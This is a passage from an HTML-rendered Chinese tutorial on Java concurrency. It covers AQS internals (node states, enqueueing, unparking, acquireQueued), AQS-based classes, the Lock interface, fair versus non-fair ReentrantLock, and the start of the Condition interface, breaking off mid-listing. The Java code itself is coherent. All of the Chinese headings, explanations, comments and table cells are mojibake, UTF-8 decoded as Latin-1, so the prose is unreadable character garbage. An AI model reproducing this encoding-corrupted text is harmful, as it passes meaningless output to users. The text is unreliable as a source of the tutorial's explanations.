    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;  <span class="hljs-comment">// èŠ‚ç‚¹å·²å–æ¶ˆ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;  <span class="hljs-comment">// åç»§èŠ‚ç‚¹éœ€è¦è¢«å”¤é†’</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;  <span class="hljs-comment">// èŠ‚ç‚¹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾…</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>;  <span class="hljs-comment">// å…±äº«æ¨¡å¼ä¸‹éœ€è¦ä¼ æ’­</span>
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€ï¼ˆvolatileä¿è¯å¯è§æ€§ï¼‰</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;
    
    <span class="hljs-comment">// å‰é©±èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node prev;
    
    <span class="hljs-comment">// åç»§èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node next;
    
    <span class="hljs-comment">// èŠ‚ç‚¹å¯¹åº”çš„çº¿ç¨‹</span>
    <span class="hljs-keyword">volatile</span> Thread thread;
    
    <span class="hljs-comment">// ä¸‹ä¸€ä¸ªç­‰å¾…èŠ‚ç‚¹ï¼ˆç”¨äºæ¡ä»¶é˜Ÿåˆ—ï¼‰</span>
    Node nextWaiter;
}
</code></pre>
<h4 data-id="heading-138">å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œ</h4>
<h5 data-id="heading-139">å…¥é˜Ÿï¼ˆaddWaiterï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addWaiter</span><span class="hljs-params">(Node mode)</span> {
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), mode);
    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> tail;
    
    <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„ï¼šé˜Ÿåˆ—ä¸ä¸ºç©ºï¼ŒCASæ·»åŠ åˆ°é˜Ÿå°¾</span>
    <span class="hljs-keyword">if</span> (pred != <span class="hljs-literal">null</span>) {
        node.prev = pred;
        <span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) {
            pred.next = node;
            <span class="hljs-keyword">return</span> node;
        }
    }
    
    <span class="hljs-comment">// æ…¢é€Ÿè·¯å¾„ï¼šé˜Ÿåˆ—ä¸ºç©ºæˆ–CASå¤±è´¥ï¼Œå®Œæ•´å…¥é˜Ÿ</span>
    enq(node);
    <span class="hljs-keyword">return</span> node;
}

<span class="hljs-keyword">private</span> Node <span class="hljs-title function_">enq</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;
        <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆå§‹åŒ–</span>
            <span class="hljs-keyword">if</span> (compareAndSetHead(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>()))
                tail = head;
        } <span class="hljs-keyword">else</span> {
            node.prev = t;
            <span class="hljs-keyword">if</span> (compareAndSetTail(t, node)) {
                t.next = node;
                <span class="hljs-keyword">return</span> t;
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-140">å‡ºé˜Ÿï¼ˆunparkSuccessorï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unparkSuccessor</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> node.waitStatus;
    <span class="hljs-keyword">if</span> (ws &lt; <span class="hljs-number">0</span>)
        compareAndSetWaitStatus(node, ws, <span class="hljs-number">0</span>);
    
    <span class="hljs-type">Node</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> node.next;
    <span class="hljs-comment">// æ‰¾åˆ°ä¸‹ä¸€ä¸ªéœ€è¦å”¤é†’çš„èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span> || s.waitStatus &gt; <span class="hljs-number">0</span>) {
        s = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail; t != <span class="hljs-literal">null</span> &amp;&amp; t != node; t = t.prev)
            <span class="hljs-keyword">if</span> (t.waitStatus &lt;= <span class="hljs-number">0</span>)
                s = t;
    }
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>)
        LockSupport.unpark(s.thread); <span class="hljs-comment">// å”¤é†’çº¿ç¨‹</span>
}
</code></pre>
<h4 data-id="heading-141">è‡ªæ—‹å’Œé˜»å¡</h4>
<h5 data-id="heading-142">acquireQueuedï¼ˆè‡ªæ—‹è·å–é”ï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            
            <span class="hljs-comment">// å‰é©±æ˜¯headï¼Œå°è¯•è·å–é”</span>
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                setHead(node);
                p.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC</span>
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼Œæ£€æŸ¥æ˜¯å¦éœ€è¦é˜»å¡</span>
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<h5 data-id="heading-143">parkAndCheckInterruptï¼ˆé˜»å¡ï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">parkAndCheckInterrupt</span><span class="hljs-params">()</span> {
    LockSupport.park(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// é˜»å¡å½“å‰çº¿ç¨‹</span>
    <span class="hljs-keyword">return</span> Thread.interrupted(); <span class="hljs-comment">// è¿”å›ä¸­æ–­çŠ¶æ€å¹¶æ¸…é™¤</span>
}
</code></pre>
<h3 data-id="heading-144">6.4 åŸºäºAQSçš„å®ç°ç±»</h3>
<h4 data-id="heading-145">ReentrantLock</h4>
<p><strong>ReentrantLockåŸºäºAQSçš„ç‹¬å æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// å®ç°tryAcquireå’ŒtryRelease</span>
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
        <span class="hljs-comment">// éå…¬å¹³é”å®ç°</span>
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
        <span class="hljs-comment">// å…¬å¹³é”å®ç°</span>
    }
}
</code></pre>
<h4 data-id="heading-146">ReentrantReadWriteLock</h4>
<p><strong>ReentrantReadWriteLockåŸºäºAQSçš„å…±äº«æ¨¡å¼å’Œç‹¬å æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantReadWriteLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ReadWriteLock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReadLock readerLock;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> WriteLock writerLock;
    
    <span class="hljs-comment">// ä½¿ç”¨AQSçš„stateï¼š</span>
    <span class="hljs-comment">// é«˜16ä½ï¼šè¯»é”è®¡æ•°</span>
    <span class="hljs-comment">// ä½16ä½ï¼šå†™é”è®¡æ•°</span>
}
</code></pre>
<h4 data-id="heading-147">Semaphore</h4>
<p><strong>SemaphoreåŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Semaphore</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// stateè¡¨ç¤ºå¯ç”¨è®¸å¯è¯æ•°é‡</span>
        <span class="hljs-comment">// tryAcquireSharedï¼šè·å–è®¸å¯è¯</span>
        <span class="hljs-comment">// tryReleaseSharedï¼šé‡Šæ”¾è®¸å¯è¯</span>
    }
}
</code></pre>
<h4 data-id="heading-148">CountDownLatch</h4>
<p><strong>CountDownLatchåŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CountDownLatch</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// stateè¡¨ç¤ºè®¡æ•°å™¨å€¼</span>
        <span class="hljs-comment">// countDownï¼šstate - 1</span>
        <span class="hljs-comment">// awaitï¼šç­‰å¾…state == 0</span>
    }
}
</code></pre>
<h4 data-id="heading-149">CyclicBarrier</h4>
<p><strong>CyclicBarrieråŸºäºReentrantLockå’ŒConditionå®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CyclicBarrier</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">trip</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-comment">// ä½¿ç”¨ReentrantLockå’ŒConditionå®ç°</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-150">ç¬¬ä¸ƒç«  Lockæ¥å£ä¸ReentrantLock</h2>
<h3 data-id="heading-151">7.1 Lockæ¥å£</h3>
<h4 data-id="heading-152">Lockæ¥å£çš„æ–¹æ³•</h4>
<p><strong>Lockæ¥å£æä¾›äº†æ¯”synchronizedæ›´çµæ´»çš„é”æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;                        <span class="hljs-comment">// è·å–é”ï¼ˆé˜»å¡ï¼‰</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">lockInterruptibly</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// å¯ä¸­æ–­è·å–é”</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">()</span>;                  <span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆä¸é˜»å¡ï¼‰</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryLock</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶è·å–é”</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span>;                      <span class="hljs-comment">// é‡Šæ”¾é”</span>
    Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span>;           <span class="hljs-comment">// è·å–æ¡ä»¶å¯¹è±¡</span>
}
</code></pre>
<p><strong>æ–¹æ³•è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>lock()</strong> - æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œè·å–é”ï¼Œå¦‚æœé”è¢«å ç”¨åˆ™é˜»å¡ç­‰å¾…</li>
<li><strong>lockInterruptibly()</strong> - å¯ä¸­æ–­çš„è·å–é”ï¼Œçº¿ç¨‹åœ¨ç­‰å¾…æ—¶å¯ä»¥è¢«ä¸­æ–­</li>
<li><strong>tryLock()</strong> - å°è¯•è·å–é”ï¼Œç«‹å³è¿”å›true/falseï¼Œä¸ä¼šé˜»å¡</li>
<li><strong>tryLock(time, unit)</strong> - åœ¨æŒ‡å®šæ—¶é—´å†…å°è¯•è·å–é”ï¼Œè¶…æ—¶è¿”å›false</li>
<li><strong>unlock()</strong> - é‡Šæ”¾é”ï¼Œå¿…é¡»åœ¨finallyå—ä¸­è°ƒç”¨</li>
<li><strong>newCondition()</strong> - åˆ›å»ºConditionå¯¹è±¡ï¼Œç”¨äºçº¿ç¨‹é—´çš„åè°ƒ</li>
</ol>
<h4 data-id="heading-153">Lock vs synchronized</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>synchronized</th><th>Lock</th></tr></thead><tbody><tr><td><strong>è·å–é”æ–¹å¼</strong></td><td>è‡ªåŠ¨è·å–å’Œé‡Šæ”¾</td><td>æ‰‹åŠ¨è·å–å’Œé‡Šæ”¾</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âŒ ä¸å¯ä¸­æ–­</td><td>âœ… å¯ä¸­æ–­ï¼ˆlockInterruptiblyï¼‰</td></tr><tr><td><strong>è¶…æ—¶è·å–</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒï¼ˆtryLockï¼‰</td></tr><tr><td><strong>å…¬å¹³é”</strong></td><td>âŒ éå…¬å¹³</td><td>âœ… å¯é€‰å…¬å¹³/éå…¬å¹³</td></tr><tr><td><strong>å¤šä¸ªæ¡ä»¶</strong></td><td>âŒ åªæœ‰ä¸€ä¸ªæ¡ä»¶</td><td>âœ… å¯ä»¥æœ‰å¤šä¸ªCondition</td></tr><tr><td><strong>ä½¿ç”¨å¤æ‚åº¦</strong></td><td>ç®€å•</td><td>è¾ƒå¤æ‚ï¼ˆéœ€è¦finallyé‡Šæ”¾ï¼‰</td></tr></tbody></table>
<p><strong>ä½¿ç”¨ç¤ºä¾‹å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// synchronizedæ–¹å¼ï¼ˆç®€å•ä½†åŠŸèƒ½æœ‰é™ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
}

<span class="hljs-comment">// Lockæ–¹å¼ï¼ˆæ›´çµæ´»ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock(); <span class="hljs-comment">// âš ï¸ å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾ï¼Œé˜²æ­¢æ­»é”</span>
    }
}

<span class="hljs-comment">// å¯ä¸­æ–­çš„è·å–é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interruptibleMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lockInterruptibly();  <span class="hljs-comment">// ç­‰å¾…æ—¶å¯ä»¥å“åº”ä¸­æ–­</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// å°è¯•è·å–é”ï¼ˆä¸é˜»å¡ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tryLockMethod</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (lock.tryLock()) {  <span class="hljs-comment">// ç«‹å³è¿”å›ï¼Œä¸ç­‰å¾…</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åŒæ­¥ä»£ç </span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// è·å–é”å¤±è´¥ï¼Œæ‰§è¡Œå…¶ä»–é€»è¾‘</span>
    }
}
</code></pre>
<h3 data-id="heading-154">7.2 ReentrantLock</h3>
<h4 data-id="heading-155">å¯é‡å…¥æ€§</h4>
<p><strong>å¯é‡å…¥é”ï¼š</strong> åŒä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–åŒä¸€æŠŠé”ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å°±åƒä¸€æŠŠé’¥åŒ™å¯ä»¥æ‰“å¼€åŒä¸€æ‰‡é—¨å¤šæ¬¡</li>
<li>é¿å…æ­»é”ï¼šæ–¹æ³•Aè°ƒç”¨æ–¹æ³•Bï¼Œä¸¤ä¸ªæ–¹æ³•éƒ½éœ€è¦åŒä¸€æŠŠé”</li>
<li>ReentrantLockæ˜¯å¯é‡å…¥çš„ï¼Œsynchronizedä¹Ÿæ˜¯å¯é‡å…¥çš„</li>
</ul>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–é”</span>
    <span class="hljs-keyword">try</span> {
        method2();  <span class="hljs-comment">// è°ƒç”¨method2ï¼Œå¯ä»¥å†æ¬¡è·å–åŒä¸€æŠŠé”</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡é‡Šæ”¾</span>
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    lock.lock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡è·å–é”ï¼ˆå¯é‡å…¥ï¼‰</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡é‡Šæ”¾</span>
    }
}
</code></pre>
<p><strong>å®ç°åŸç†ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨stateè®°å½•é‡å…¥æ¬¡æ•°</li>
<li>æ¯æ¬¡lock()ï¼Œstate + 1</li>
<li>æ¯æ¬¡unlock()ï¼Œstate - 1</li>
<li>state == 0æ—¶ï¼Œé”è¢«å®Œå…¨é‡Šæ”¾</li>
</ul>
<h4 data-id="heading-156">å…¬å¹³é”ä¸éå…¬å¹³é”</h4>
<p><strong>æ ¸å¿ƒåŒºåˆ«ï¼š</strong> è·å–é”çš„é¡ºåºä¸åŒ</p>
<h5 data-id="heading-157">éå…¬å¹³é”ï¼ˆé»˜è®¤ï¼‰</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> æ–°æ¥çš„çº¿ç¨‹å¯èƒ½"æ’é˜Ÿ"ï¼Œç›´æ¥å°è¯•è·å–é”</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();  <span class="hljs-comment">// é»˜è®¤éå…¬å¹³é”</span>
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// æ˜¾å¼æŒ‡å®šéå…¬å¹³é”</span>
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼šå…ˆå°è¯•ç›´æ¥è·å–é”ï¼Œå¤±è´¥æ‰æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (CASå°è¯•ç›´æ¥è·å–é”) {  <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜Ÿ</span>
        <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// æˆåŠŸ</span>
    }
    åŠ å…¥é˜Ÿåˆ—ç­‰å¾…;  <span class="hljs-comment">// å¤±è´¥æ‰æ’é˜Ÿ</span>
}
</code></pre>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âœ… æ€§èƒ½æ›´å¥½ï¼ˆå‡å°‘çº¿ç¨‹åˆ‡æ¢ï¼‰</li>
<li>âœ… ååé‡æ›´é«˜</li>
<li>âŒ å¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿ï¼ˆæŸäº›çº¿ç¨‹ä¸€ç›´è·å–ä¸åˆ°é”ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> å¤§å¤šæ•°åœºæ™¯æ¨èä½¿ç”¨éå…¬å¹³é”</p>
<h5 data-id="heading-158">å…¬å¹³é”</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> ä¸¥æ ¼æŒ‰ç…§ç­‰å¾…æ—¶é—´é¡ºåºè·å–é”ï¼Œå…ˆæ¥å…ˆæœåŠ¡</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å…¬å¹³é”</span>
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…¬å¹³é”ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ï¼Œæœ‰ç­‰å¾…çš„çº¿ç¨‹å°±æ’é˜Ÿ</span>
lock() {
    <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
        åŠ å…¥é˜Ÿåˆ—ç­‰å¾…;  <span class="hljs-comment">// ä¸æ’é˜Ÿ</span>
    } <span class="hljs-keyword">else</span> {
        å°è¯•è·å–é”;
    }
}
</code></pre>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âœ… å…¬å¹³æ€§ä¿è¯ï¼Œé¿å…é¥¥é¥¿</li>
<li>âœ… ç­‰å¾…æ—¶é—´é•¿çš„çº¿ç¨‹ä¼˜å…ˆè·å¾—é”</li>
<li>âŒ æ€§èƒ½è¾ƒå·®ï¼ˆæ›´å¤šä¸Šä¸‹æ–‡åˆ‡æ¢ï¼‰</li>
<li>âŒ ååé‡è¾ƒä½</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> éœ€è¦ä¸¥æ ¼å…¬å¹³æ€§çš„åœºæ™¯</p>
<p><strong>æ€§èƒ½å¯¹æ¯”æ€»ç»“ï¼š</strong></p>
<ul>
<li><strong>éå…¬å¹³é”</strong>ï¼šæ€§èƒ½å¥½ï¼ˆçº¦å¿«10-20%ï¼‰ï¼Œé€‚åˆå¤§å¤šæ•°åœºæ™¯</li>
<li><strong>å…¬å¹³é”</strong>ï¼šæ€§èƒ½å·®ï¼Œä½†æ›´å…¬å¹³ï¼Œé€‚åˆå¯¹å…¬å¹³æ€§è¦æ±‚é«˜çš„åœºæ™¯</li>
<li><strong>é€‰æ‹©å»ºè®®</strong>ï¼šé™¤éæœ‰ç‰¹æ®Šéœ€æ±‚ï¼Œå¦åˆ™ä½¿ç”¨éå…¬å¹³é”</li>
</ul>
<h3 data-id="heading-159">7.3 Conditionæ¥å£</h3>
<h4 data-id="heading-160">Conditionçš„ä½œç”¨</h4>
<p><strong>Condition</strong>æä¾›äº†ç±»ä¼¼Object.wait/notifyçš„çº¿ç¨‹ç­‰å¾…å’Œå”¤é†’æœºåˆ¶ï¼Œä½†åŠŸèƒ½æ›´å¼ºå¤§ã€‚</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>Conditionæ˜¯Lockçš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶</li>
<li>ä¸€ä¸ªLockå¯ä»¥åˆ›å»ºå¤šä¸ªCondition</li>
<li>æ¯”wait/notifyæ›´çµæ´»ã€æ›´ç²¾ç¡®</li>
</ul>
<p><strong>Conditionæ¥å£æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Condition</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">await</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;              <span class="hljs-comment">// ç­‰å¾…ï¼Œå¯ä¸­æ–­</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">awaitUninterruptibly</span><span class="hljs-params">()</span>;                          <span class="hljs-comment">// ç­‰å¾…ï¼Œä¸å¯ä¸­æ–­</span>
    <span class="hljs-type">long</span> <span class="hljs-title function_">awaitNanos</span><span class="hljs-params">(<span class="hljs-type">long</span> nanosTimeout)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶ç­‰å¾…ï¼ˆçº³ç§’ï¼‰</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">await</span><span class="hljs-params">(<span class="hljs-type">long</span> time, TimeUnit unit)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// è¶…æ—¶ç­‰å¾…</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">awaitUntil</span><span class="hljs-params">(Date deadline)</span> <span class="hljs-keyword">throws</span> InterruptedException;  <span class="hljs-comment">// ç­‰å¾…åˆ°æŒ‡å®šæ—¶é—´</span>
    
